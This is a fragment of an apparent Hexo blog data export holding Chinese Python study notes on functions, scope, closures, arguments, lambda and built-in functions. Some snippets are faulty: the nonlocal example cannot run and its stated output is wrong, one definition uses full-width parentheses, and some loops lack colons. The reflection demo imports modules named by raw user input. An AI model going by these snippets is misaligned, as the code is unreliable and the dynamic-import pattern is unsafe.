class=\"line\"></span><br><span class=\"line\">f1(<span class=\"number\">2</span>) <span class=\"comment\">#返回4，f1记住了x=2的这个状态</span></span><br><span class=\"line\">f2(<span class=\"number\">2</span>) <span class=\"comment\">#返回8，f2记住了x=4的这个状态</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>除了上面的闭包，可以让Python函数保存状态的方法还有：共享全局变量、参数使用默认值。最好的方法是OOP。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 参数使用默认值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">make</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">act</span><span class=\"params\">(y,x=x)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> x*y</span><br><span class=\"line\">    <span class=\"keyword\">return</span> act</span><br><span class=\"line\"><span class=\"comment\">#效果等同于闭包，该方法适用于全部Python版本</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04-参数\"><a href=\"#0x04-参数\" class=\"headerlink\" title=\"0x04 参数\"></a>0x04 参数</h4><ul>\n<li>参数是通过引用赋值的，被传递的参数从来不自动拷贝。</li>\n<li>赋值的变量，即形参，是属于本地作用域的。</li>\n<li>因为是引用赋值传递，因此在函数内对传入的可变对象参数进行修改，会对其他引用影响。</li>\n<li>通常情况下，参数通过位置从左到右赋值传递给形参，传递的参数要与形参数量对应。也可以使用name=value的关键字传参赋值方法。位置参数必须在关键字参数之前。</li>\n<li>可以为形参指定默认值。</li>\n<li>实参与形参传递规则：         <ul>\n<li>通过位置分配非关键字参数。    </li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过匹配变量名（形参名）分配关键字参数。</span><br><span class=\"line\"></span><br><span class=\"line\">其他没有分配的非关键字参数分配到 *args的元组中。</span><br><span class=\"line\"></span><br><span class=\"line\">其他没有匹配的关键字参数分配到**args的字典中。</span><br><span class=\"line\"></span><br><span class=\"line\">没有分配到参数的形参使用默认值参数。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>*与 **：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*、**在实参前表示对传递的参数对象进行解包。\t</span><br><span class=\"line\">\t*的参数对象必须为序列，**的为参数对象必须为字典。</span><br><span class=\"line\">\t </span><br><span class=\"line\">*、**在形参前表示让形参接收所有没有匹配其他形参的参数。</span><br><span class=\"line\">\t *将接收的参数放入一个元组。</span><br><span class=\"line\">\t **将接受的关键字赋值参数放入一个字典。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>定义函数时使用 * ，则它之后的形参在函数调用时都必须使用关键字赋值。（keyword-only）</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def fun1（a,*b,c,d,e）:</span><br><span class=\"line\">\t<span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">fun1（<span class=\"number\">1</span>,<span class=\"number\">2</span>,c=<span class=\"number\">3</span>,d=<span class=\"number\">4</span>,e=<span class=\"number\">5</span>） <span class=\"comment\"># *之后的必须用关键字赋值</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>定义函数时使用**的形参位置必须是最后一个。</li>\n<li>事实上。*对所有可迭代对象有用。</li>\n<li>name=value在调用中表示关键字参数；name=value在函数定义中表示默认值。</li>\n</ul>\n<h4 id=\"0x05-匿名函数-lambda\"><a href=\"#0x05-匿名函数-lambda\" class=\"headerlink\" title=\"0x05 匿名函数 lambda\"></a>0x05 匿名函数 lambda</h4><ul>\n<li>是def外，另一种生成函数对象的方式。</li>\n<li>lambda是表达式而不是语句，因此可以用于def不能用于的地方。</li>\n<li>lambda主体是表达式，而不是代码块，意味着只能写于一行。</li>\n<li>lambda同样遵循LEGB法则，因此也支持闭包。</li>\n<li>默认会返回结果。</li>\n</ul>\n<h5 id=\"0x06-函数定义\"><a href=\"#0x06-函数定义\" class=\"headerlink\" title=\"0x06 函数定义\"></a>0x06 函数定义</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">lambda</span> &lt;arg1,arg2...&gt; : expression</span><br><span class=\"line\"></span><br><span class=\"line\">f = <span class=\"keyword\">lambda</span> x,y : x+y</span><br><span class=\"line\"></span><br><span class=\"line\">f(<span class=\"number\">1</span>,<span class=\"number\">2</span>) <span class=\"comment\">#返回3</span></span><br><span class=\"line\">(<span class=\"keyword\">lambda</span> x,y:x+y)(<span class=\"number\">1</span>,<span class=\"number\">2</span>) <span class=\"comment\">#返回3</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>lambda会创建并返回一个函数对象。</li>\n<li>lambda也可以使用默认参数。</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"0x00-函数概述\"><a href=\"#0x00-函数概述\" class=\"headerlink\" title=\"0x00 函数概述\"></a>0x00 函数概述</h4><ul>\n<li>def是可执行语句，即运行def语句后，函数才会存在于内存。</li>\n<li>def创建一个函数对象并将其赋值给某一变量名（函数名）。该变量是函数对象的一个引用。</li>\n<li>return语句会将一个结果对象返回给调用者，没有return语句默认返回NONE。也表示函数的调用结束。</li>\n<li>lambda可以创建函数并自动将结果返回。（def需要用return返回）</li>\n<li>yield语句也会将结果返回调用函数者，并且会记住它离开的地方。</li>\n<li>global语句用于声明一个模块级的变量。</li>\n<li>参数是通过对象引用赋值传递的。</li>\n</ul>","more":"<h4 id=\"0x01-def-函数定义\"><a href=\"#0x01-def-函数定义\" class=\"headerlink\" title=\"0x01 def 函数定义\"></a>0x01 def 函数定义</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> &lt;<span class=\"title\">name</span>&gt;<span class=\"params\">(arg1,arg2,arg3.....)</span></span></span><br><span class=\"line\"><span class=\"function\">    &lt;<span class=\"title\">statements</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>def是实时运行的，运行def语句后才会创建函数对象（封装函数代码并将这个对象赋值给变量名）。 因此运行了def后（运行模块、导入模块等），才能调用函数。(注：调用不能在定义之前，因为Python不像C等语言，有先全部编译的过程，Python的语句都是实时运行的）</li>\n<li>def语句定义的函数名是对象引用赋值，函数名是指向函数对象所在内存的一个引用而已。</li>\n<li>def语句在运行时才会评估（执行），而函数的主体内容在函数调用时才会评估（执行）。</li>\n<li>可以有0个或以上个参数，称为形参</li>\n<li>function_name（）——函数名加上（args….）表示函数的调用，每调用一次就会运行函数主体代码。</li>\n</ul>\n<h4 id=\"0x02-return-函数返回值\"><a href=\"#0x02-return-函数返回值\" class=\"headerlink\" title=\"0x02 return 函数返回值\"></a>0x02 return 函数返回值</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span>，<span class=\"string\">'a'</span>,&#123;<span class=\"string\">'b'</span>:<span class=\"number\">2</span>&#125;,[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]，x+y</span><br></pre></td></tr></table></figure>\n<ul>\n<li>return是可选的，没有时默认返回none</li>\n<li>可以返回任意类型的值，但只能返回表达式，而不能是语句。返回多个值时，这些值将被放入一个元组中。</li>\n</ul>\n<h4 id=\"0x03-变量作用域（LEGB法则）\"><a href=\"#0x03-变量作用域（LEGB法则）\" class=\"headerlink\" title=\"0x03 变量作用域（LEGB法则）\"></a>0x03 变量作用域（LEGB法则）</h4><ul>\n<li>作用域（命名空间） 即能访问到该变量的范围；变量赋值的位置决定了它所在的命名空间。</li>\n<li>Python创建、查找、修改变量名都是在命名空间进行的。不同命名空间的同名变量名不会冲突。</li>\n<li>函数定义本地作用域，模块定义全局作用域。</li>\n<li>变量的作用域由赋值的位置决定，分为三种作用域：</li>\n</ul>\n<blockquote>\n<p>对于每个def内的，叫本地作用域。</p>\n<p>函数嵌套了函数，那么对于被嵌套函数而言，嵌套函数的变量是非本地的（nonlocal）。</p>\n<p>在def外的（包括函数名），叫全局作用域。</p>\n</blockquote>\n<ul>\n<li>全局作用域的作用范围仅限于单个文件（模块），导入模块会得到被导入模块的全局变量访问权。</li>\n<li>只有对变量赋值才会产生本地变量。如对列表进行索引修改、执行append（）等的这种原处修改的对象不会产生本地变量。</li>\n<li>默认情况下：<ul>\n<li>每一个函数内的变量（赋值操作）、形参、被此函数嵌套的函数名、函数内import 模块名都是属于此函数的本地作用域。      </li>\n<li>通过 global 【scope】声明变量为全局变量。</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun1</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    a=<span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    \t<span class=\"keyword\">global</span> a</span><br><span class=\"line\">    \t<span class=\"keyword\">print</span> (a)</span><br><span class=\"line\">    fun2()    \t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#调用函数fun1后，打印的值是1，因为声明了a为全局变量。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>通过 nonlocal 【scope】声明变量为非本地变量。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"number\">1</span>   <span class=\"comment\">#全局变量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun1</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">   a=<span class=\"number\">2</span> <span class=\"comment\">#本地变量</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun2</span><span class=\"params\">()</span>:</span><span class=\"comment\">#fun1下的a对于fun2为非本地变量。</span></span><br><span class=\"line\">        a=<span class=\"number\">5</span> <span class=\"comment\">#本地变量</span></span><br><span class=\"line\">    \t<span class=\"keyword\">nonlocal</span> a</span><br><span class=\"line\">    \t<span class=\"keyword\">print</span> (a)</span><br><span class=\"line\">   fun2()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#调用函数fun1后，打印的值是2，因为声明了a为非本地变量。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>变量名查找法则（LEGB/LNGB)：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">L：首先先查找本地作用域。</span><br><span class=\"line\">E/N：若有嵌套，（被嵌套函数）其次查找嵌套函数的作用域（即嵌套函数的本地作用域）</span><br><span class=\"line\">G：再次，查找全局作用域。</span><br><span class=\"line\">B：最后查找内置作用域。</span><br><span class=\"line\"></span><br><span class=\"line\">依次按顺序查找，不可逆向查找。</span><br><span class=\"line\">查找到第一个结果后不再继续查找，会将第一个查找结果作为结果。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>每一次函数的调用都会产生一个新的作用域。（这点对去理解函数递归很重要）</li>\n<li>函数执行完毕后，本次函数调用产生的本地作用域也将消失，意味着变量将消失，但是变量的状态会被记住。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#闭包（Closure）是词法闭包（Lexical Closure）的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#闭包/工厂函数：一个能记住嵌套作用域变量值的函数，尽管那个作用域或许已经不存在。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">make</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">act</span><span class=\"params\">(y)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> x*y</span><br><span class=\"line\">    <span class=\"keyword\">return</span> act</span><br><span class=\"line\">f1=make(<span class=\"number\">2</span>)</span><br><span class=\"line\">f2=make(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">f1(<span class=\"number\">2</span>) <span class=\"comment\">#返回4，f1记住了x=2的这个状态</span></span><br><span class=\"line\">f2(<span class=\"number\">2</span>) <span class=\"comment\">#返回8，f2记住了x=4的这个状态</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>除了上面的闭包，可以让Python函数保存状态的方法还有：共享全局变量、参数使用默认值。最好的方法是OOP。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 参数使用默认值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">make</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">act</span><span class=\"params\">(y,x=x)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> x*y</span><br><span class=\"line\">    <span class=\"keyword\">return</span> act</span><br><span class=\"line\"><span class=\"comment\">#效果等同于闭包，该方法适用于全部Python版本</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04-参数\"><a href=\"#0x04-参数\" class=\"headerlink\" title=\"0x04 参数\"></a>0x04 参数</h4><ul>\n<li>参数是通过引用赋值的，被传递的参数从来不自动拷贝。</li>\n<li>赋值的变量，即形参，是属于本地作用域的。</li>\n<li>因为是引用赋值传递，因此在函数内对传入的可变对象参数进行修改，会对其他引用影响。</li>\n<li>通常情况下，参数通过位置从左到右赋值传递给形参，传递的参数要与形参数量对应。也可以使用name=value的关键字传参赋值方法。位置参数必须在关键字参数之前。</li>\n<li>可以为形参指定默认值。</li>\n<li>实参与形参传递规则：         <ul>\n<li>通过位置分配非关键字参数。    </li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过匹配变量名（形参名）分配关键字参数。</span><br><span class=\"line\"></span><br><span class=\"line\">其他没有分配的非关键字参数分配到 *args的元组中。</span><br><span class=\"line\"></span><br><span class=\"line\">其他没有匹配的关键字参数分配到**args的字典中。</span><br><span class=\"line\"></span><br><span class=\"line\">没有分配到参数的形参使用默认值参数。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>*与 **：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*、**在实参前表示对传递的参数对象进行解包。\t</span><br><span class=\"line\">\t*的参数对象必须为序列，**的为参数对象必须为字典。</span><br><span class=\"line\">\t </span><br><span class=\"line\">*、**在形参前表示让形参接收所有没有匹配其他形参的参数。</span><br><span class=\"line\">\t *将接收的参数放入一个元组。</span><br><span class=\"line\">\t **将接受的关键字赋值参数放入一个字典。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>定义函数时使用 * ，则它之后的形参在函数调用时都必须使用关键字赋值。（keyword-only）</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def fun1（a,*b,c,d,e）:</span><br><span class=\"line\">\t<span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">fun1（<span class=\"number\">1</span>,<span class=\"number\">2</span>,c=<span class=\"number\">3</span>,d=<span class=\"number\">4</span>,e=<span class=\"number\">5</span>） <span class=\"comment\"># *之后的必须用关键字赋值</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>定义函数时使用**的形参位置必须是最后一个。</li>\n<li>事实上。*对所有可迭代对象有用。</li>\n<li>name=value在调用中表示关键字参数；name=value在函数定义中表示默认值。</li>\n</ul>\n<h4 id=\"0x05-匿名函数-lambda\"><a href=\"#0x05-匿名函数-lambda\" class=\"headerlink\" title=\"0x05 匿名函数 lambda\"></a>0x05 匿名函数 lambda</h4><ul>\n<li>是def外，另一种生成函数对象的方式。</li>\n<li>lambda是表达式而不是语句，因此可以用于def不能用于的地方。</li>\n<li>lambda主体是表达式，而不是代码块，意味着只能写于一行。</li>\n<li>lambda同样遵循LEGB法则，因此也支持闭包。</li>\n<li>默认会返回结果。</li>\n</ul>\n<h5 id=\"0x06-函数定义\"><a href=\"#0x06-函数定义\" class=\"headerlink\" title=\"0x06 函数定义\"></a>0x06 函数定义</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">lambda</span> &lt;arg1,arg2...&gt; : expression</span><br><span class=\"line\"></span><br><span class=\"line\">f = <span class=\"keyword\">lambda</span> x,y : x+y</span><br><span class=\"line\"></span><br><span class=\"line\">f(<span class=\"number\">1</span>,<span class=\"number\">2</span>) <span class=\"comment\">#返回3</span></span><br><span class=\"line\">(<span class=\"keyword\">lambda</span> x,y:x+y)(<span class=\"number\">1</span>,<span class=\"number\">2</span>) <span class=\"comment\">#返回3</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>lambda会创建并返回一个函数对象。</li>\n<li>lambda也可以使用默认参数。</li>\n</ul>"},{"title":"Python基础学习系列Chapter 9：内置方法","date":"2019-03-29T07:56:48.000Z","_content":"\n### A\n\n#### abs() #绝对值\n\n##### all() #序列的元素全真为真(负数也算真)\n\n##### any() #序列的元素任一为真则真\n\n##### max() #方法返回给定参数的最大值，参数可以为序列。\n\n##### min() #方法返回给定参数的最小值，参数可以为序列。\n\n##### pow() #方法返回 xy（x的y次方） 的值。\n\n##### sum() #对可迭代对象求和。\n\n##### divmod(a, b) #给定被除数和除数，返回商和余数在元组中。\n\n<!-- more -->\n\n------\n\n##### ascii() #类似 repr() 函数,返回一个表示对象的字符串\n\n------\n\n##### bin() #返回十进制数的二进制\n\n##### oct() #函数将一个整数转换成8进制字符串。\n\n##### hex() #函数用于将10进制整数转换成16进制整数。\n\n------\n\n### B\n\n##### bool() #返回给定对象的布尔值\n\n##### bytearray() #返回一个新字节数组。数组里的元素是可变的\n\n##### callable() #检查一个对象是否是可调用的。\n\n> 对于函数, 方法, lambda 函式, 类, 以及实现了` __call__` 方法的类实例, 它都返回 True。\n\n------\n\n##### chr() # 返回值是当前整数对应的ascii字符。\n\n##### ord() # 返回字符对应的十进制整数。\n\n------\n\n##### compile() #将一个字符串编译为字节代码。\n\n------\n\n##### eval() #执行一个字符串表达式，并返回表达式的值。\n\n##### exec() #执行储存在字符串或文件中的 Python 语句。\n\n- 相比于 eval，exec可以执行更复杂的 Python 代码。\n- exec 返回值永远为 None。\n\n------\n\n##### frozenset() #返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。\n\n------\n\n##### enumerate()\n\n- 给定一个可迭代对象返回一个迭代器。迭代器每次可返回可迭代对象的元素及其元素对应的下标在一个元组中。\n\n##### filter() #函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。\n\n- 迭代序列，将每次迭代结果作为参数传入函数中。\n- 返回一个迭代器。\n\n```python\nfor i in filter(lambda x:x>5,range(10))\n# 返回 6,7,8,9\n```\n\n##### map() #迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。\n\n- 返回一个迭代器。\n\n```python\na = map(lambda x:8 if x>2 else x,range(4))\nfor i in a:\n    print(i) #返回0，1，2，8\n```\n\n##### zip() #分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。\n\n- 返回一个迭代器。\n\n```python\na = [1,2,3]\nb = [4,5,6]\nfor i in zip(a,b) #返回(1, 4), (2, 5), (3, 6)\n```\n\n------\n\n##### globals() #以字典类型返回当前位置的全部全局变量。\n\n##### locals() #函数会以字典类型返回当前位置的全部局部变量。\n\n##### hash() #获取取一个对象（字符串或者数值等）的哈希值。\n\n------\n\n##### dir()\n\n- 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；\n- 带参数时，返回参数的属性、方法列表。\n\n##### id() #函数用于获取对象的内存地址。\n\n- == 判断字符是否对应相同，相同返回True\n- is 判断内存地址是否相同，相同返回True\n\n##### type() #返回对象的类型。\n\n- isinstance() 与 type() 区别：type() 不会认为子类是一种父类类型，不考虑继承关系。\n\n##### isinstance() #判断对象是否为另一对象的实例。\n\n- isinstance() 与 type() 区别：isinstance() 会认为子类是一种父类类型，考虑继承关系。\n\n##### issubclass() #判断对象是否为另一对象的子类。\n\n##### len() #返回对象（字符、列表、元组等）长度或项目个数。\n\n------\n\n##### memoryview() # 返回给定参数的内存查看对象(Momory view)。\n\n##### range() 函数可创建一个整数列表，一般用在 for 循环中。\n\n```python\nrange(start, stop[, step])\n```\n\n##### reversed() #返回一个反转的迭代器。\n\n##### round() #方法返回浮点数x的四舍五入值。\n\n##### sorted() 函数对所有可迭代的对象进行排序操作。\n\n- sort 与 sorted 区别：\n\n> sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。\n>\n> sort是原处修改，sorted是产生新对象。\n\n```python\n# 按value进行排序\nsorted（dict.items(),key=lambda x:x[1]）\n```\n\n##### vars() #函数返回对象object的属性和属性值的字典对象。\n\n##### \\_\\_import__()  #用于动态导入模块 。 \n\n- 即可以以字符串类型的模块名导入模块。\n\n```\nimport os <==> __import__('os')\n```\n\n###### 反射\n\n```python\n1.反射：利用字符串的形式去对象中操作（获取，查询，设置，删除）属性.\n\tgetattr(module,attr)：到module对象（可以是模块等）查询attr属性并返回（可以是函数等）。\n\thasattr(module,attr)：判断module对象是否有attr属性，有返回True,没有false。\n\tsetattr(module,attr)：到module对象设置属性（导入模块会存在内存中，只会影响内存中的模块。）\n\tdelattr(module,attr)：删除module对象的attr属性（在内存中而不会影响原模块 ）。\n\n2.例子：例如通过反射实现用户输入URL自动跳转到相应页面。\n\timport modul\n\tdef f1():\n    \tuser_input = input('please input url:')\n    \tif hasattr(modul,user_input):\n        \tfun=getattr(modul,user_input)#返回函数体（函数名），而不是执行结果\n        \tfun()\n    \telse:\n        \tprint('not found')\n\tf1()\n\n\n#当需要的属性处于不同对象（模块）时，需要导入很多模块，不现实\n#可以通过根据用户输入的判断导入哪个模块及其属性\n#用户输入类型为str,但import module  ！=  import ’module‘\n#但mod=__import__('mudule')等价于import module as mod\n#提供了通过字符串导入模块的功能\n\tuser_input=input('please input url(xx/xx):')#输入格式为【模块名/属性】\n\tdef f2():\n    \tmod_name,attr_name=user_input.split('/')\n    \tmodu=__import__(mod_name) #引入模块命名为modu\n    \tif hasattr(modu,attr_name):\n        \tfun=getattr(modu,attr_name)\n        \tfun()\n    \telse:\n        \tprint(404)\n\tf2()\n\n#若要导入模块不在当前目录下，而是某目录下（如abc目录下）\n#__import__（'abc.module'）导入只会到abc，而不会到module\n#__import__（'abc.module'，fromlist=True）加了该参数便可以\n```\n\n","source":"_posts/08python基础学习系列之内置函数.md","raw":"---\ntitle: Python基础学习系列Chapter 9：内置方法\ndate: 2019-03-29 15:56:48\ntags:\n\t- Python基础\n\t- Language\ncategories: Python\n---\n\n### A\n\n#### abs() #绝对值\n\n##### all() #序列的元素全真为真(负数也算真)\n\n##### any() #序列的元素任一为真则真\n\n##### max() #方法返回给定参数的最大值，参数可以为序列。\n\n##### min() #方法返回给定参数的最小值，参数可以为序列。\n\n##### pow() #方法返回 xy（x的y次方） 的值。\n\n##### sum() #对可迭代对象求和。\n\n##### divmod(a, b) #给定被除数和除数，返回商和余数在元组中。\n\n<!-- more -->\n\n------\n\n##### ascii() #类似 repr() 函数,返回一个表示对象的字符串\n\n------\n\n##### bin() #返回十进制数的二进制\n\n##### oct() #函数将一个整数转换成8进制字符串。\n\n##### hex() #函数用于将10进制整数转换成16进制整数。\n\n------\n\n### B\n\n##### bool() #返回给定对象的布尔值\n\n##### bytearray() #返回一个新字节数组。数组里的元素是可变的\n\n##### callable() #检查一个对象是否是可调用的。\n\n> 对于函数, 方法, lambda 函式, 类, 以及实现了` __call__` 方法的类实例, 它都返回 True。\n\n------\n\n##### chr() # 返回值是当前整数对应的ascii字符。\n\n##### ord() # 返回字符对应的十进制整数。\n\n------\n\n##### compile() #将一个字符串编译为字节代码。\n\n------\n\n##### eval() #执行一个字符串表达式，并返回表达式的值。\n\n##### exec() #执行储存在字符串或文件中的 Python 语句。\n\n- 相比于 eval，exec可以执行更复杂的 Python 代码。\n- exec 返回值永远为 None。\n\n------\n\n##### frozenset() #返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。\n\n------\n\n##### enumerate()\n\n- 给定一个可迭代对象返回一个迭代器。迭代器每次可返回可迭代对象的元素及其元素对应的下标在一个元组中。\n\n##### filter() #函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。\n\n- 迭代序列，将每次迭代结果作为参数传入函数中。\n- 返回一个迭代器。\n\n```python\nfor i in filter(lambda x:x>5,range(10))\n# 返回 6,7,8,9\n```\n\n##### map() #迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。\n\n- 返回一个迭代器。\n\n```python\na = map(lambda x:8 if x>2 else x,range(4))\nfor i in a:\n    print(i) #返回0，1，2，8\n```\n\n##### zip() #分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。\n\n- 返回一个迭代器。\n\n```python\na = [1,2,3]\nb = [4,5,6]\nfor i in zip(a,b) #返回(1, 4), (2, 5), (3, 6)\n```\n\n------\n\n##### globals() #以字典类型返回当前位置的全部全局变量。\n\n##### locals() #函数会以字典类型返回当前位置的全部局部变量。\n\n##### hash() #获取取一个对象（字符串或者数值等）的哈希值。\n\n------\n\n##### dir()\n\n- 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；\n- 带参数时，返回参数的属性、方法列表。\n\n##### id() #函数用于获取对象的内存地址。\n\n- == 判断字符是否对应相同，相同返回True\n- is 判断内存地址是否相同，相同返回True\n\n##### type() #返回对象的类型。\n\n- isinstance() 与 type() 区别：type() 不会认为子类是一种父类类型，不考虑继承关系。\n\n##### isinstance() #判断对象是否为另一对象的实例。\n\n- isinstance() 与 type() 区别：isinstance() 会认为子类是一种父类类型，考虑继承关系。\n\n##### issubclass() #判断对象是否为另一对象的子类。\n\n##### 